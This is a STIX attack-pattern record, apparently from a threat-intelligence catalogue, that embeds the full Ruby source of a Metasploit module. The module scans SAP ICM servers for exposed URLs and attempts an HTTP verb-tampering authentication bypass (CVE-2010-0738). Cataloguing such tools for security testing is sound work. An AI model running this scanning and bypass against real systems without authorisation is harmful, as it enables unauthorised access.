{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--39cb06d8-5815-42a7-8359-a72791176e9a",
    "created": "2024-08-14T16:26:58.128014Z",
    "modified": "2024-08-14T16:26:58.128019Z",
    "name": "SAP URL Scanner",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_icm_urlscan.rb",
            "external_id": "sap_icm_urlscan.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0738#VERBauthbypass"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'SAP URL Scanner',\n      'Description'   => %q{\n        This module scans for commonly found SAP Internet Communication Manager URLs\n        and outputs return codes for the user.\n      },\n      'Author'          => [ 'Chris John Riley' ],\n      'References'      =>\n        [\n          [ 'CVE', '2010-0738' ] # VERB auth bypass\n        ],\n      'License'         => MSF_LICENSE\n      ))\n\n    register_options(\n      [\n        OptString.new('VERB',    [true, \"Verb for auth bypass testing\", \"HEAD\"]),\n        OptPath.new('URLFILE', [true, \"SAP ICM Paths File\",\n          File.join(Msf::Config.data_directory, 'wordlists', 'sap_icm_paths.txt')])\n      ])\n  end\n\n  # Base Structure of module borrowed from jboss_vulnscan\n  def run_host(ip)\n     res = send_request_cgi(\n      {\n        'uri'       => \"/\" + Rex::Text.rand_text_alpha(12),\n        'method'    => 'GET',\n      })\n\n    if res\n      print_status(\"Note: Please note these URLs may or may not be of interest based on server configuration\")\n      @info = []\n      if res.headers['Server']\n        @info << res.headers['Server']\n        print_status(\"#{rhost}:#{rport} Server responded with the following Server Header: #{@info[0]}\")\n      else\n        print_status(\"#{rhost}:#{rport} Server responded with a blank or missing Server Header\")\n      end\n\n      if (res.body && /class=\"note\">(.*)code:(.*)</i.match(res.body) )\n        print_error(\"#{rhost}:#{rport} SAP ICM error message: #{$2}\")\n      end\n\n      # Load URLs\n      urls_to_check = check_urlprefixes\n      File.open(datastore['URLFILE']) do |f|\n        f.each_line do |line|\n          urls_to_check.push line\n        end\n      end\n\n      print_status(\"#{rhost}:#{rport} Beginning URL check\")\n      @valid_urls = ''\n      urls_to_check.each do |url|\n        check_url(url.strip)\n      end\n    else\n      print_error(\"#{rhost}:#{rport} No response received\")\n    end\n\n    if @valid_urls.length > 0\n      l = store_loot(\n        'sap.icm.urls',\n        \"text/plain\",\n        datastore['RHOST'],\n        @valid_urls,\n        \"icm_urls.txt\", \"SAP ICM Urls\"\n      )\n      print_line\n      print_good(\"Stored urls as loot: #{l}\") if l\n    end\n  end\n\n  def check_url(url)\n    full_url = write_url(url)\n    res = send_request_cgi({\n      'uri'       => normalize_uri(url),\n      'method'    => 'GET',\n    })\n\n    if (res)\n      if res.headers['Server']\n        unless @info.include?(res.headers['Server'])\n          print_good(\"New server header seen [#{res.headers['Server']}]\")\n          @info << res.headers['Server'] #Add To seen server headers\n        end\n      end\n\n      case res.code\n      when 200\n        print_good(\"#{full_url} - does not require authentication (#{res.code}) (length: #{res.headers['Content-Length']})\")\n        @valid_urls << full_url << \"\\n\"\n      when 403\n        print_status(\"#{full_url} - restricted (#{res.code})\")\n      when 401\n        print_status(\"#{full_url} - requires authentication (#{res.code}): #{res.headers['WWW-Authenticate']}\")\n        @valid_urls << full_url << \"\\n\"\n        # Attempt verb tampering bypass\n        bypass_auth(url)\n      when 404\n        # Do not return by default, only display in verbose mode\n        vprint_status(\"#{full_url} - not found (#{res.code})\")\n      when 400, 500\n        print_status(\"#{full_url} - produced a server error (#{res.code})\")\n      when 301, 302\n        print_good(\"#{full_url} - redirected (#{res.code}) to #{res.redirection} (not following)\")\n        @valid_urls << full_url << \"\\n\"\n      when 307\n        print_status(\"#{full_url} - redirected (#{res.code}) to #{res.redirection} (not following)\")\n      else\n        print_error(\"#{full_url} - unhandled response code #{res.code}\")\n        @valid_urls << full_url << \"\\n\"\n      end\n\n    else\n      vprint_status(\"#{full_url} - not found (No Repsonse code Received)\")\n    end\n  end\n\n  def write_url(path)\n    if datastore['SSL']\n      protocol = 'https://'\n    else\n      protocol = 'http://'\n    end\n\n    \"#{protocol}#{rhost}:#{rport}#{path}\"\n  end\n\n  def bypass_auth(url)\n    full_url = write_url(url)\n    vprint_status(\"#{full_url} Check for verb tampering (#{datastore['VERB']})\")\n\n    res = send_request_raw({\n      'uri'       => normalize_uri(url),\n      'method'    => datastore['VERB'],\n      'version'   => '1.0' # 1.1 makes the head request wait on timeout for some reason\n    })\n\n    if (res && res.code == 200)\n      print_good(\"#{full_url} Got authentication bypass via HTTP verb tampering\")\n    else\n      vprint_status(\"#{rhost}:#{rport} Could not get authentication bypass via HTTP verb tampering\")\n    end\n  end\n\n  # \"/urlprefix outputs the list of URL prefixes that are handled in the ABAP part of the SAP Web AS.\n  # This is how the message server finds out which URLs must be forwarded where.\n  #  (SAP help) -> this disclose custom URLs that are also checked for authentication\n  def check_urlprefixes\n    urls = []\n    res = send_request_cgi({\n      'uri'       => \"/sap/public/icf_info/urlprefix\",\n      'method'    => 'GET',\n    })\n\n    if (res && res.code == 200)\n      res.body.each_line do |line|\n        if line =~ /PREFIX=/\n          url_enc = line.sub(/^PREFIX=/, '')\n          # Remove CASE and VHOST\n          url_enc = url_enc.sub(/&CASE=.*/, '')\n          url_dec = URI.unescape(url_enc).sub(/;/, '')\n          urls << url_dec.strip\n        end\n      end\n    else\n      print_error(\"#{rhost}:#{rport} Could not retrieve urlprefixes\")\n    end\n\n    urls\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Chris John Riley ]",
        ""
    ]
}